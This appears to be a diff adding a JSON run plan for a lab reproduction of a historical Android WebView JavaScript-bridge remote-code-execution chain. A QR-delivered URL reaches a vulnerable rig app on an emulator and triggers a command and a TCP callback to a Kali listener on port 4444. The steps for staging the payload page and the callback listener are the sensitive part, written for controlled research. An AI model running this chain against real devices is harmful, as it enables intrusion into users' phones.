@@ -1,0 +1,42 @@
+{
+  "phase": "P6",
+  "work_item": "W6.3",
+  "chain_class": "C1 — JS-bridge RCE (addJavascriptInterface, CVE-2012-6636 family; historical, already-patched, reproduced on a deliberately vulnerable build per policy §7)",
+  "chain": "QR URL sheet -> scan/open (physical slot or load_url.sh) -> emulator WebView (targetSdk-16 rig app) -> page JS -> vulnerable JS bridge -> app-process command execution -> TCP session callback to Kali-side listener stub",
+  "policy": "docs/governance/policy.md §1 lab-only, §2 benign demo bodies / no default endpoints, §7 historical-patched-only. Emulator + owned devices ONLY.",
+  "target": {
+    "avd": "p6rig-api22",
+    "api_level": 22,
+    "note_on_api_level": "API 22 boots a targetSdk-16 APK (no install-time targetSdk block) and keeps the C1 reflection window open for legacy-target apps; the platform-side fix landed in API 17 keyed on app targetSdk.",
+    "app": "mobile/rig/target-app (com.qrcompromise.p6rig, minSdk 16 / targetSdk 16)",
+    "app_build": "physical slot: open mobile/rig/target-app in Android Studio -> Build > Build APK(s)",
+    "app_install": "adb install -r app/build/outputs/apk/debug/app-debug.apk"
+  },
+  "steps": [
+    { "n": 1, "action": "physical slot: install Android Studio + SDK cmdline-tools + platform-tools", "cmd": "see mobile/rig/README.md §2" },
+    { "n": 2, "action": "create the AVD", "cmd": "mobile/rig/harness/create_avd.sh 22 x86_64" },
+    { "n": 3, "action": "start the emulator", "cmd": "emulator -avd p6rig-api22" },
+    { "n": 4, "action": "physical slot: build + install the rig target app", "cmd": "adb install -r app/build/outputs/apk/debug/app-debug.apk" },
+    { "n": 5, "action": "start the Kali-side session listener (explicit host/port only)", "cmd": "python3 mobile/rig/harness/listener_stub.py --host <kali-lan-ip> --port 4444" },
+    { "n": 6, "action": "serve the staging dir on the Kali box", "cmd": "python3 -m http.server 8000 --directory mobile/rig/staging" },
+    { "n": 7, "action": "copy payload.example.html to payload.html with YOUR lab host, then print its URL as a QR sheet", "cmd": "mobile/qr/url_sheet.sh http://<kali-lan-ip>:8000/payload.html out/p6-sheet.pdf" },
+    { "n": 8, "action": "U stage: open the URL on the emulator (adb simulates what a QR-scanner app hands the OS; a physical scan of the printed sheet is the optional human step)", "cmd": "mobile/rig/harness/load_url.sh http://<kali-lan-ip>:8000/payload.html --pkg com.qrcompromise.p6rig" },
+    { "n": 9, "action": "capture device-side telemetry", "cmd": "adb logcat -s P6RIG P6RIGQR chromium" },
+    { "n": 10, "action": "verify session on the Kali side", "cmd": "listener prints: session N proof: 'P6RIG-SESSION device=<Build.FINGERPRINT>' then 'VERIFIED'" }
+  ],
+  "expected_logcat_markers": [
+    "P6RIG loading url=http://<kali-lan-ip>:8000/payload.html",
+    "P6RIG BRIDGE_REACHED mark=stage-e-bridge-reached",
+    "P6RIG BRIDGE_EXEC cmd=log -p i -t P6RIGQR stage_e_exec_ok",
+    "P6RIG BRIDGE_EXEC done",
+    "P6RIG BRIDGE_CALLBACK target=<kali-lan-ip>:4444",
+    "P6RIG BRIDGE_CALLBACK sent"
+  ],
+  "control_arm_expected": "opening the same URL in the stock emulator browser (no --pkg) must NOT emit any BRIDGE_* marker — this negative control proves the marker set belongs to the vulnerable bridge class, not to generic page activity.",
+  "telemetry_to_capture": [
+    "adb logcat -s P6RIG P6RIGQR (marker timeline, timestamps in order U->E->C)",
+    "listener_stub.py session log (Kali-side proof line + peer IP/port + wall-clock)",
+    "adb shell dumpsys package com.qrcompromise.p6rig (targetSdk=16 evidence for the C1 gate)",
+    "run wall-clock start/end so Stage-2 timing analysis can be layered on top"
+  ]
+}
